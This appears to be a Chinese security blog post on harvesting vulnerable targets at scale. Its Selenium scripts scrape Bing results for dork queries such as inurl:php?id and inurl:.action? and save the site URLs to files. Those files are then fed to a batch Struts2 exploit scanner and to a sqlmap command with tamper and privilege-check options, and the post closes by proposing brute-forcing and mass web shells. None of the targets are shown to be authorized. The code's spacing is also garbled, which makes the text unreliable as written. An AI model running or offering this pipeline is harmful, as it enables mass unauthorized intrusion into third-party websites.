原创： K  合天智汇

  

**前言**

 **selenium基础知识**

 **制定爬取目标**

 **编写代码**

 **实现效果**

 **总结**

前言

这篇文章，带大家初谈爬虫对于安全的魅力；本篇抛砖引玉，仅仅sql和stu2的历史爬虫，其他的搜索关键字也可以

selenium基础知识

 **介绍**

python做爬虫，如果爬取静态网页，requests库用作请求，bs4和lxml库用作分析抓取的网页内容非常不错；

现在各大搜索引擎都是动态加载，关于爬取动态网页，我了解了一些方法：

1.直接url:找js的api接口

2.webkit 手工模拟js

3.scrapyjs scrapyjs相当于粘合剂的作用,可以将splash整合进scrapy中

4.splash+ docker

5.phatomjs + selenium 结合使用 模拟浏览器，消耗大，不适合大型爬虫

这里我们用方法5，不过phatomjs不再和selenium组cp（可以继续用），而火狐和google也推出了无头浏览器方式，所以我们用google浏览器的驱动来达成目标（调试时注意版本，不同版本的css和xpath选择表达式可能不同）

我没有用无头方式，注意是便于调试加上我们仅仅是安全研究；如果读者要用，继续这样修改即可：

chrome_options= Options()

chrome_options.add_argument("--headless")

driver=webdriver.Chrome(executable_path=(r'D:\selenium\chrome/chromedriver.exe'),chrome_options=chrome_options)

 **安装selenium**

下载驱动器：

https://www.cnblogs.com/freeweb/p/4568463.html

https://www.cnblogs.com/qiezizi/p/8632058.html

python安装selenium库即可（pipinstall selenium）

 **一些简单的语法知识，大家自行搜索**

 **selenium的FAQ**  

这点我还是要提出来，语法很简单，关键调试很麻烦

1、无法定位元素

这个问题是没有加载完网页就取元素了，本来第一次是设置sleep()，可是会导致socket断开，所以就用内置的

importselenium.webdriver.support.ui as ui

wait= ui.WebDriverWait(driver,20)

printwait.until(lambda x: x.find_element_by_css_selector("#b_results> li.b_pag
> nav > ul > li:nth-child(3) > a")).text

2、python的ascii编码

importsys

reload(sys)

sys.setdefaultencoding(‘utf-8’)

3、元素不在视图

最蛋疼的，寻找了好久方法

出现elementnot visible

用ActionChains模拟鼠标点击

参考：

http://www.mamicode.com/info-detail-1981462.html

4、制定爬取目标

怎样编写呢？我们来搜索bing国际版本，爬取struts2可能存在的漏洞

![图片.png](https://image.3001.net/images/20180929/1538200453_5baf1385d1a07.png!small)  

5、编写代码

编写过程，有兴趣可以研究下，作者这里提几点，其他语法还是简单的搜索好了，然后一页一页的向下翻，收集每页的网址；这里的
xpath和css选择的语法和你下的浏览器驱动版本有关，进浏览器然后更改选择代码即可（不要说运行不了，亲测可用的）

代码：

#coding=utf-8

importsys

reload(sys)

sys.setdefaultencoding('utf-8')

importtime

fromselenium import webdriver

importselenium.webdriver.support.ui as ui

fromselenium.webdriver.common.keys import Keys

fromselenium.common.exceptions import TimeoutException

#引入ActionChains鼠标操作类

fromselenium.webdriver.common.action_chains import ActionChains

start_url="https://cn.bing.com/search?q=inurl%3a.action%3f&qs=n&sp=-1&pq=inurl%3a.action%3f≻=1-14&sk=&cvid=DBCB283FC96249E8A522340DF4740769&first=67&FORM=PERE4"

urls=range(200)

m=0

s=[1,2,3,4,5,6,7,8,9]

driver=webdriver.Chrome(executable_path="D:/selenium/chrome/chromedriver.exe")

wait=ui.WebDriverWait(driver,20)

driver.get(start_url)

forn in range(7,57):

ifn%2 == 1:#国内版

i=7

else:

i=8

i=7

forj in s[0:]:

try:

#//*[@id="b_results"]/li[1]/h2/a国际版本

#printwait.until(lambdax:x.find_element_by_xpath('//*[@id="b_results"]/li['+str(j)+']/h2/a').get_attribute("href"))

#urls[m]=wait.until(lambdax:x.find_element_by_xpath('//*[@id="b_results"]/li['+str(j)+']/h2/a').get_attribute("href"))

#国内版本

printwait.until(lambdax:x.find_element_by_xpath('/html/body/div[1]/ol[1]/li['+str(j)+']/h2/a').get_attribute("href"))

urls[m]=wait.until(lambdax:x.find_element_by_xpath('/html/body/div[1]/ol[1]/li['+str(j)+']/h2/a').get_attribute("href"))

m=m+1

exceptException as e:

continue

try:

printi

ActionChains(driver).click(wait.until(lambdax:
x.find_element_by_css_selector("#b_results > li.b_pag >nav > ul > li:nth-child("+str(i)+") >a"))).perform()

exceptException as e:

continue

withopen("urlss.txt","a+") as f:

forurl in urls[0:]:

f.write(str(url))

f.write('\n')

f.close()

driver.quit()

实现效果

这里用的某公司的批量工具

工具链接：

https://www.jb51.net/softs/574358.html

提供一个开源的stu工具链接：github的开源项目，紧跟步伐，刚更新了前几天的057

作者项目地址：

https://github.com/Lucifer1993/struts-scan

测试的效果图如下：

  
![图片.png](https://image.3001.net/images/20180929/1538200463_5baf138fd86d2.png!small)  

 **补充**

虽然sql的洞不好找，前两年来打，是成片区的，现在不好了，但是作者还是写了个爬取代码

目标：搜索敏感词语：inurl:php?id

代码：

#coding=utf-8

importsys

reload(sys)

sys.setdefaultencoding('utf-8')

importtime

fromselenium import webdriver

importselenium.webdriver.support.ui as ui

fromselenium.webdriver.common.keys import Keys

fromselenium.common.exceptions import TimeoutException

#引入ActionChains鼠标操作类

fromselenium.webdriver.common.action_chains import ActionChains

start_url="https://cn.bing.com/search?q=inurl%3aphp%3fid%3d&qs=HS≻=8-0&cvid=2EEF822D8FE54B6CAAA1CE0169CA5BC5&sp=1&first=53&FORM=PERE3"

urls=range(800)

m=0

s=[1,2,3,4,5,6,7,8,9,10,11,12,13,14]

driver=webdriver.Chrome(executable_path="D:/selenium/chrome/chromedriver.exe")

wait=ui.WebDriverWait(driver,20)

driver.get(start_url)

fori in range(1,50):

forj in s[0:]:

try:

urls[m]=wait.until(lambdax:x.find_element_by_xpath('//*[@id="b_results"]/li['+str(j)+']/h2/a').get_attribute("href"))

printurls[m]

m=m+1

exceptException as e:

e.message

printi

try:

ActionChains(driver).click(wait.until(lambdax:
x.find_element_by_css_selector("#b_results > li.b_pag >nav > ul > li:nth-child(7) > a"))).perform()

exceptException as e:

continue

printm

withopen("urls.txt","a+") as f:

forurl in urls[0:]:

f.write(str(url))

f.write('\n')

f.close()

driver.quit()

测试效果

由于周期太长，没有具体去测试，但是url是爬取下来的，我给出sqlmap的指令

（正在考虑shell多线程跑sqlmap，提供思路参考，学习为目的，漏洞很少很少了；shell多线程参考：https://blog.csdn.net/bluecloudmatrix/article/details/48421577）

sqlmap-murls.txt --batch--delay=1.3--level=3--tamper=space2comment--dbms=mysql
--technique=EUS--random-agent--is-dba--time-sec=10| tee result.txt

 **分析命令**

1、sqlmap -m 指定文件

2、--delay 指定每次请求requests的间隔时间，默认0.5

3、--level 检测请求头，如来源，agent等，默认是1

4、--dbms=mysql 指定数据库是mysql

5、--technique=EUS,(不做盲注的检测，本来周期就长)

B:Boolean-based blind SQL injection（布尔型注入）

E:Error-based SQL injection（报错型注入）

U:UNION query SQL injection（可联合查询注入）

S:Stacked queries SQL injection（可多语句查询注入）

T:Time-based blind SQL injection（基于时间延迟注入）

6、tee管道命令，显示在屏幕的同时输出到文件中供我们分析

总结

1、初步了解了师傅们的批量也是通过寻找目标机子开始的，所以爬虫是我们的好朋友

2、通过关键字在搜索引擎上搜索目标（inurl:.active inuel:php?id）

3、我们通过爬虫来爬取了目标(selenium的动态爬取)

4、我们通过现有的工具来分析目标：某批量stru工具以及神器sqlmap

5、可发散思维，如密码爆破呀，批量shell呀，可以不可以结合起来呢

  

